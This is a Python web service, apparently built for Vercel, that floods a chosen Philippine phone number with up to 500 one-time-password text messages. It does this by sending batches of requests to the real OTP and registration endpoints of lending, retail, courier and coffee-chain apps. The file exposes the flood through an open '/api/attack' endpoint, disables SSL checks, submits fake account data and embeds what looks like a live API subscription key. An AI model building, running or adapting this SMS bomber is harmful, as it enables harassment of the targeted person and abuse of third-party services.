import json
import aiohttp
import asyncio
import random
from aiohttp import web
import time

# Service configurations
SERVICES = [
    {
        "name": "EZLOAN",
        "url": "https://gateway.ezloancash.ph/security/auth/otp/request",
        "method": "POST",
        "data": lambda phone: {"businessId": "EZLOAN", "contactNumber": phone[1:]},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "XPRESS", 
        "url": "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
        "method": "POST",
        "data": lambda phone: {
            "Phone": phone,
            "Email": f"user{random.randint(10000,99999)}@gmail.com",
            "Password": "Test123456!"
        },
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "ABENSON",
        "url": "https://api.mobile.abenson.com/api/public/membership/activate_otp", 
        "method": "POST",
        "data": lambda phone: {"contact_no": phone[1:]},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "PICKUP_COFFEE",
        "url": "https://production.api.pickup-coffee.net/v2/customers/login",
        "method": "POST", 
        "data": lambda phone: {"mobile_number": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "HONEY_LOAN",
        "url": "https://api.honeyloan.ph/api/client/registration/step-one",
        "method": "POST",
        "data": lambda phone: {"phone": phone[1:]},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "KOMO_PH",
        "url": "https://api.komo.ph/api/otp/v5/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone[1:]},
        "headers": {
            "Content-Type": "application/json",
            "Ocp-Apim-Subscription-Key": "cfde6d29634f44d3b81053ffc6298cba"
        }
    },
    {
        "name": "LBC",
        "url": "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
        "method": "POST",
        "data": lambda phone: {"client_contact_no": phone[4:], "client_contact_code": "+63"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    }
]

def normalize_phone(phone):
    """Normalize Philippine phone number to international format"""
    phone = str(phone).strip().replace(" ", "").replace("-", "")
    
    if phone.startswith("0") and len(phone) == 11:
        return "+63" + phone[1:]
    elif phone.startswith("63") and len(phone) == 12:
        return "+" + phone
    elif phone.startswith("+63") and len(phone) == 13:
        return phone
    else:
        return ""

async def send_sms(service_config, phone):
    """Send SMS using specific service"""
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            data = service_config["data"](phone)
            
            if service_config["method"] == "POST":
                if service_config["headers"].get("Content-Type") == "application/x-www-form-urlencoded":
                    async with session.post(
                        service_config["url"],
                        data=data,
                        headers=service_config["headers"],
                        ssl=False
                    ) as response:
                        return response.status in [200, 201, 202, 204]
                else:
                    async with session.post(
                        service_config["url"],
                        json=data,
                        headers=service_config["headers"],
                        ssl=False
                    ) as response:
                        return response.status in [200, 201, 202, 204]
            else:
                return False
                
    except Exception as e:
        print(f"Error in {service_config['name']}: {str(e)}")
        return False

async def run_attack(target_number, sms_count):
    """Main attack function"""
    phone = normalize_phone(target_number)
    if not phone:
        return {"error": "Invalid Philippine mobile number. Must be 11 digits starting with 09"}
    
    sms_count = min(max(1, sms_count), 500)
    success = 0
    failed = 0
    
    print(f"Starting attack on {phone} with {sms_count} SMS")
    
    # Create batches to avoid overwhelming
    batch_size = min(10, sms_count)
    batches = [batch_size] * (sms_count // batch_size)
    if sms_count % batch_size > 0:
        batches.append(sms_count % batch_size)
    
    for batch_num, batch_size in enumerate(batches):
        print(f"Processing batch {batch_num + 1}/{len(batches)}")
        
        tasks = []
        for _ in range(batch_size):
            service = random.choice(SERVICES)
            tasks.append(send_sms(service, phone))
        
        # Execute batch with delay between batches
        if batch_num > 0:
            await asyncio.sleep(1)
            
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                success += 1
            else:
                failed += 1
        
        print(f"Batch {batch_num + 1}: Success={success}, Failed={failed}")
        
        # Small delay between batches
        if batch_num < len(batches) - 1:
            await asyncio.sleep(0.5)
    
    return {
        "success": success,
        "failed": failed, 
        "total": success + failed,
        "message": f"Attack completed: {success} successful, {failed} failed out of {sms_count} requested"
    }

async def api_handler(request):
    """Handle API requests"""
    # CORS headers
    cors_headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    }
    
    # Handle preflight
    if request.method == 'OPTIONS':
        return web.Response(status=200, headers=cors_headers)
    
    try:
        # Parse request data
        data = await request.json()
        target = data.get('target', '').strip()
        sms_count = int(data.get('sms', 100))
        
        print(f"Received request: target={target}, sms={sms_count}")
        
        # Validate input
        if not target or len(target) != 11 or not target.startswith('09'):
            return web.json_response(
                {"error": "Invalid number format. Must be 11 digits starting with 09"},
                status=400,
                headers=cors_headers
            )
        
        if sms_count < 1 or sms_count > 500:
            return web.json_response(
                {"error": "SMS count must be between 1-500"},
                status=400, 
                headers=cors_headers
            )
        
        # Run attack
        result = await run_attack(target, sms_count)
        
        return web.json_response(result, headers=cors_headers)
        
    except json.JSONDecodeError:
        return web.json_response(
            {"error": "Invalid JSON in request body"},
            status=400,
            headers=cors_headers
        )
    except Exception as e:
        print(f"Server error: {str(e)}")
        return web.json_response(
            {"error": f"Internal server error: {str(e)}"},
            status=500,
            headers=cors_headers
        )

# Create application
app = web.Application()

# Add routes
app.router.add_post('/api/attack', api_handler)
app.router.add_options('/api/attack', api_handler)

# Vercel handler
async def handler(request):
    return await api_handler(request)
